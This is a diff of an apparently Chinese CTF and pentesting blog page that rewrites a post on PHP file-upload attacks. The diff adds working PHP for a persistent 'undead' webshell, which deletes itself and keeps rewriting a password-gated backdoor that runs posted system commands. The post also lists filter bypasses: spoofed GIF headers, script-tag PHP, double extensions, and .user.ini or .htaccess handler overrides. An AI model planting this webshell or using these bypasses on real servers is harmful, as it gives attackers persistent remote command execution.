@@ -3,7 +3,7 @@
   <head>
      
     <meta charset="UTF-8">
-    <title>shell upload - d0ud</title>
+    <title>PHP文件上传 - d0ud</title>
     <link rel="shortcut icon" href="/static/img/icon.png">
     <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
     
@@ -15,7 +15,7 @@
 
     <meta name="viewport" content="width=device-width, maximum-scale=1, initial-scale=1"/>
     <meta property="og:site_name" content="d0ud">
-    <meta property="og:title" content="shell upload"/>
+    <meta property="og:title" content="PHP文件上传"/>
     
     <style>body:before{ content: ''; background-image: url(https://github.com/null-d0ud/d0ud/blob/main/bgg.png) }</style>
     
@@ -40,7 +40,7 @@
         <div class="has-child">
             <a>分类</a>
             <div class="sub-menu">
-                <a class="category-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><a class="category-link" href="/categories/another/">another</a><a class="category-link" href="/categories/authentication/">authentication</a><a class="category-link" href="/categories/code-audit/">code audit</a><a class="category-link" href="/categories/file-upload/">file upload</a><a class="category-link" href="/categories/wp/">wp</a>
+                <a class="category-link" href="/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">PHP代码审计</a><a class="category-link" href="/categories/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">PHP文件上传</a><a class="category-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><a class="category-link" href="/categories/authentication/">authentication</a><a class="category-link" href="/categories/file-upload/">file upload</a><a class="category-link" href="/categories/wp/">wp</a>
             </div>
         </div>
         
@@ -52,23 +52,33 @@
     <main>
     <div class="wrap min">
         <section class="post-title">
-            <h2>shell upload</h2>
+            <h2>PHP文件上传</h2>
             <div class="post-meta">
-                <time class="date">2023.09.05</time>
+                <time class="date">2023.09.15</time>
             
-                <span class="category"><a class="category-link" href="/categories/file-upload/">file upload</a></span>
+                <span class="category"><a class="category-link" href="/categories/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">PHP文件上传</a></span>
             
             </div>
         </section>
         <article class="post-content">
         
-            <p>前端文件后缀限制</p>
-<ol>
-<li>抓包修改</li>
-</ol>
-<p>后端文件后缀限制</p>
-<ol>
-<li>上传.user.ini文件或.htaccess文件<blockquote>
+            <h1 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h1><p>不死马，即难以清除的木马。<br>一般原理为：在可以上传文件的情况下，上传一个可执行文件，这个文件的作用是在服务端创建一个进程，然后删除自身，创建的进程会不停的在服务端生成木马文件。<br>网上最常见的脚本为</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+<span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.shell.php'</span><span class="token punctuation">;</span>
+<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php if(md5($_GET["pass"])=="2591c98b70119fe624898b1e424b5e91")&#123;@system($_POST[cmd]);&#125; ?>'</span><span class="token punctuation">;</span>
+<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="前端限制文件后缀"><a href="#前端限制文件后缀" class="headerlink" title="前端限制文件后缀"></a>前端限制文件后缀</h1><p>通过抓包修改即可</p>
+<h1 id="后端限制文件后缀"><a href="#后端限制文件后缀" class="headerlink" title="后端限制文件后缀"></a>后端限制文件后缀</h1><p>想要绕过后端限制，最重要的是知道过滤规则</p>
+<p>比如文件头检查我们就可以加上图片文件头，如<code>GIF8a</code></p>
+<p>文件内容检查就可以用<code>&lt;script language=&#39;php&#39;&gt;</code>来代替 <code>&lt;?php</code></p>
+<p>或者利用解析漏洞，加上无法解析的后缀，如上传<code>shell.php.abc</code>等等</p>
+<h2 id="通过上传-user-ini文件或-htaccess文件来绕过"><a href="#通过上传-user-ini文件或-htaccess文件来绕过" class="headerlink" title="通过上传.user.ini文件或.htaccess文件来绕过"></a>通过上传.user.ini文件或.htaccess文件来绕过</h2><blockquote>
 <p>PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。</p>
 <p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
 <p>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
@@ -76,8 +86,6 @@
 <p>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。</p>
 <p>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p>
 </blockquote>
-</li>
-</ol>
 <p>.user.ini</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">auto_prepend_file=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>file_path</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -86,34 +94,22 @@
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FileMatch</span> <span class="token attr-name">"&lt;file_name</span><span class="token punctuation">></span></span>">
 SetHandler application/x-httpd-php
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FileMatch</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<ol start="2">
-<li>利用解析漏洞，加上无法解析的后缀，如上传shell.php.abc</li>
-</ol>
-<p>文件头检查</p>
-<ol>
-<li>加上图片文件头，如GIF8a</li>
-</ol>
-<p>文件内容检查</p>
-<ol>
-<li>&lt;script language=’php’&gt; 代替 &lt;?php</li>
-<li></li>
-</ol>
 
+<hr>
+<p>也可以利用解析漏洞，加上无法解析的后缀，如上传shell.php.abc</p>
+<hr>
+<h1 id="尚在更新中"><a href="#尚在更新中" class="headerlink" title="尚在更新中"></a>尚在更新中</h1>
         </article>
         <section class="post-near">
             <ul>
                 
-                    <li>上一篇: <a href="/%E4%B8%8D%E6%AD%BB%E9%A9%AC/">不死马</a></li>
+                    <li>上一篇: <a href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li>
                 
                 
-                    <li>下一篇: <a href="/php%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E6%95%B0%E5%80%BC%E6%AF%94%E8%BE%83/">php字符串与数值比较</a></li>
+                    <li>下一篇: <a href="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">PHP代码审计</a></li>
                 
             </ul>
         </section>
-        
-            <section class="post-tags">
-            <a class="-none-link" href="/tags/basic/" rel="tag">basic</a>
-            </section>
         
     
         <section class="post-author">
@@ -140,7 +136,7 @@ SetHandler application/x-httpd-php
             <div class="row">
                 <div class="col-m-4">
                     <h3 class="title-recent">最新文章：</h3>
-                    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/%E9%A2%98%E8%A7%A3/">一些CTF题解</a></li><li class="post-list-item"><a class="post-list-link" href="/%E4%B8%8D%E6%AD%BB%E9%A9%AC/">不死马</a></li><li class="post-list-item"><a class="post-list-link" href="/shell%20upload/">shell upload</a></li><li class="post-list-item"><a class="post-list-link" href="/php%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E6%95%B0%E5%80%BC%E6%AF%94%E8%BE%83/">php字符串与数值比较</a></li><li class="post-list-item"><a class="post-list-link" href="/basic_web_directory/">web directory</a></li></ul>
+                    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></li><li class="post-list-item"><a class="post-list-link" href="/%E5%B7%A5%E5%85%B7/">工具</a></li><li class="post-list-item"><a class="post-list-link" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">PHP文件上传</a></li><li class="post-list-item"><a class="post-list-link" href="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">PHP代码审计</a></li><li class="post-list-item"><a class="post-list-link" href="/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li></ul>
                 </div>
                 <div class="col-m-4">
                     <h3 class="title-date">历史：</h3>
@@ -148,7 +144,7 @@ SetHandler application/x-httpd-php
                 </div>
                 <div class="col-m-4">
                     <h3 class="title-tags">标签：</h3>
-                    <a href="/tags/basic/" style="font-size: 20px;">basic</a> <a href="/tags/script/" style="font-size: 10px;">script</a>
+                    <a href="/tags/script/" style="font-size: 10px;">script</a>
                 </div>
             </div>
         </section>
